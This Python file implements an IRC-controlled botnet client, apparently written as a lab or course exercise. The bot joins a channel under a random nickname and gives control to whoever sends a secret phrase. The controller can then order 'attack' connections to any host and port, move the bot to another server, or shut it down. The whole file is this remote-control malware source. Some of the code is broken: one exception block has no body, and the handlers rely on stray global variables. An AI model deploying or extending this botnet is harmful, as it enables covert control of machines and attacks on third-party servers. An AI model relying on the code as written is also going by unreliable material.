#!/usr/bin/python3

import sys
import socket
import random
import string

class PyBot:
  #PyBot object constructor 
  def __init__(self,host,port,channel,secret,s):

    #Create PyBot instanace variables
    self.host = host
    self.port = port
    self.channel = channel
    self.secret = secret
    self.nick = self.generateRandomName()
    self.controllerName = ""
    self.socket = s

    while True:
      try:
        self.socket.connect((host,int(port)))  
        self.socket.send(bytes("NICK " + self.nick + "\n", "UTF-8"))
        self.socket.send(bytes("USER " +self.nick+" "+self.nick+" "+self.nick+ " " + self.nick+ "\n","UTF-8"))
        break
      except:
#        print("DEBUG --> Unable to connect to irc server")
        self.nick = self.generateRandomName()
    self.socket.send(bytes("JOIN " + channel + "\n", "UTF-8")) #Join channel once server connect succeeds
 
  #Listen for incoming data from the IRC server
  def listen(self):
    while True:
      data = ""
      data = self.socket.recv(4096).decode("UTF-8")
      data = data.strip("\n\r")
      dataLen = len(data.split()) #Split on white space
 
      #EX dataLen = 2 --> PING :sinisalo.freenode.net
      #we are interested in data.split index 0 (PING)
      if dataLen == 2 and data.split()[0] == "PING":
#        print("DEBUG --> data recieved: PING REQUEST")
        self.socket.send(bytes("PONG :pingis\n","UTF-8")) 

      #Example $:causingchaos!~chaos@d75-155-72-40.abhsia.telus.net PRIVMSG #Windows95xx :jesus
      #[':causingchaos!~chaos@d75-155-72-40.abhsia.telus.net', 'PRIVMSG', '#Windows95xx', ':jesus']
      # len >= 4  we are interested in data at index 1
      elif dataLen >= 4 and data.split()[1] == "PRIVMSG": 
#        print("DEBUG --> PRIVMSG/data recieved: ")
        senderDetails = data.split()[0].split(":")[1]
        senderNick = senderDetails.split("!")[0]
        channelOrUser = data.split()[2]   # THIS VARIABLE TELLS IF MESSAGE WAS sent publicly (#Channel), or private message (Our Nick)
        temp = data.split("PRIVMSG")[1].split(":")
        senderMessage = temp[1]
        self.examinePrivmsg(senderNick,senderMessage)
      
      #Example: $:causingchaos!~chaos@d75-155-72-40.abhsia.telus.net KICK #Windows95xx VWD0U52I VWD0U52I
      #[':causingchaos!~chaos@d75-155-72-40.abhsia.telus.net', 'KICK', '#Windows95xx', 'D2JFX0QV', ':get', 'out'] len=6
      #[':causingchaos!~chaos@d75-155-72-40.abhsia.telus.net', 'KICK', '#Windows95xx', 'VWD0U52I', ':VWD0U52I']  len=5
      #kicks with or without reason.
      elif (dataLen == 5 or dataLen == 6) and data.split()[1] == "KICK":
#        print("DEBUG --> KICK data recieved: ")
        print( str(data.split()) )
        self.socket.send(bytes("JOIN " + channel + "\n", "UTF-8"))
                                        
  def examinePrivmsg(self,senderNick,senderMessage):

#    print("DEBUG --> "+senderNick+" says:"+senderMessage)
    if senderMessage == secret:
#      print("DEBUG --> Controller said the secret! Control Mode enabled, at your command troll")
      self.controllerName = senderNick
      outMessage = "BotName$$: "+self.nick
      self.socket.send(bytes("PRIVMSG "+self.controllerName+" :"+outMessage+"\n", "UTF-8"))

    elif senderNick == self.controllerName: 
      if senderMessage.split()[0] == "attack":
#        print("DEBUG --> attack requested by controller")
        self.attackServer(senderMessage)

      elif senderMessage.split()[0] == "move":
#        print("DEBUG --> move requested by controller")      #NOTE for later #should we check if the argument has a hash tag or not?
        self.changeServer(senderMessage)

      elif senderMessage == "shutdown":
#        print("DEBUG --> shutdown requested by controller")
        outMessage = "DOWN"
        #s.send(bytes("PRIVMSG "+self.channel+" :"+outMessage+"\n","UTF-8")) #sends channel message
        self.socket.send(bytes("PRIVMSG "+self.controllerName+" :"+outMessage+"\n", "UTF-8"))
        self.socket.send(bytes("QUIT \n","UTF-8"))
        self.socket.close()
        sys.exit()

  def attackServer(self,senderMessage):

    if len(senderMessage.split()) == 3:
      attackCounter = 1
      attackHost = senderMessage.split()[1]
      attackPort = senderMessage.split()[2]
#      print("DEBUG --> attempting to attack: "+attackHost+" "+attackPort) 
      try:       
        attackSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        attackSocket.connect((attackHost,int(attackPort)))
        attackMessage = str(attackCounter) +" "+ self.nick
        outMessage = "SUCCESS"
        self.socket.send(bytes("PRIVMSG "+self.controllerName+" :"+outMessage+"\n", "UTF-8")) #sends private message
        attackSocket.send(bytes(attackMessage, "UTF-8"))
        attackCounter += 1
        attackSocket.close()
      except:
        #outMessage = self.nick+": attack failed, no such hostname"
        outMessage = "FAILURE"
        self.socket.send(bytes("PRIVMSG "+self.controllerName+" :"+outMessage+"\n", "UTF-8")) #sends private message
#        print("DEBUG --> Unable to attack the server, host name doesn't exist: "+attackHost+" "+attackPort)
    #I'm assuming that a successfull connection plus failed message = SUCCESS
    
    else: #Not enough arguments
#      print("DEBUG --> Controller tried to attack with this bot, invalid number of arguments")
      outMessage = "Cannot attack with :"+self.nick+ " , invalid number of arguments"
      self.socket.send(bytes("PRIVMSG "+self.controllerName+" :"+outMessage+"\n", "UTF-8")) #sends private message
      self.socket.send(bytes("PRIVMSG "+self.channel+" :"+outMessage+"\n","UTF-8")) #sends public message
      outMessage = "Usage> attack <host-name> <port>"
      self.socket.send(bytes("PRIVMSG "+self.channel+" :"+outMessage+"\n","UTF-8")) #sends public message
      self.socket.send(bytes("PRIVMSG "+self.controllerName+" :"+outMessage+"\n", "UTF-8")) #sends private message

  def changeServer(self,senderMessage):
   
    if len(senderMessage.split()) == 4:
      newHost = senderMessage.split()[1]
      newPort = senderMessage.split()[2]
      newChannel = senderMessage.split()[3]
      print("Trying to move bot to: "+newHost+":"+newPort+" "+newChannel)

      try:
        testSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        testSocket.connect((newHost,int(newPort)))
        self.socket.send(bytes("QUIT \n","UTF-8"))
        self.socket.close()
        self.socket = testSocket  #Set the new socket
        self.host = newHost       #Set the new host
        self.port = newPort       #Set the new port
        self.channel = newChannel #Set the new channel
        self.controllerName = ""  #Reset the controllerName (as it might change)
        while True:
          try:
            self.socket.send(bytes("NICK " + self.nick + "\n", "UTF-8"))
            self.socket.send(bytes("USER " +self.nick+" "+self.nick+" "+self.nick+ " " + self.nick+ "\n","UTF-8"))
            break
          except:
            print("DEBUG --> Unable to connect to irc server with this username, trying a new username")
            self.nick = self.generateRandomName()
#        print("DEBUG8")
        self.socket.send(bytes("JOIN " + self.channel + "\n", "UTF-8")) #Join channel once server connect succeeds
      except:
#        print("DEBUG --> Either server doesn't exist, it's a secure server, or bad arguments")
    else:
#      print("DEBUG --> Controller tried to move this bot, but wrong number of arguments")
      outMessage = "Cannot move:"+self.nick+ " to a new server, invalid # of arguments"
      self.socket.send(bytes("PRIVMSG "+self.controllerName+" :"+outMessage+"\n", "UTF-8")) #sends private message
      self.socket.send(bytes("PRIVMSG "+self.channel+" :"+outMessage+"\n","UTF-8")) #sends public message
      outMessage = "Usage> move <host-name> <port> <channel>"
      self.socket.send(bytes("PRIVMSG "+self.channel+" :"+outMessage+"\n","UTF-8")) #sends public message
      self.socket.send(bytes("PRIVMSG "+self.controllerName+" :"+outMessage+"\n", "UTF-8")) #sends private message

  def generateRandomName(self):
    #randomName = "Bot" + random.choice(string.digits) + random.choice(string.digits)
    #UPDATE --> The following line is fixed:
    randomName = "".join(random.choice(string.ascii_uppercase + string.digits) for i in range(8))
    return randomName

#Main
if __name__ == '__main__':

  if(len(sys.argv) == 5):
    host = sys.argv[1]
    port = sys.argv[2]
    channel = "#"+sys.argv[3]  #CAn't get it to work if user enters channel with #, do we need this?
    secret = sys.argv[4]
  else:
    print("Incorrect number of arguments")
    sys.exit("Usage: bot <hostname> <port> <channel> <secret-phrase>")

  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  bot = PyBot(host,port,channel,secret,s) #Create an instance of the bot 
  bot.listen() #listen to channel for incoming data over socket
  












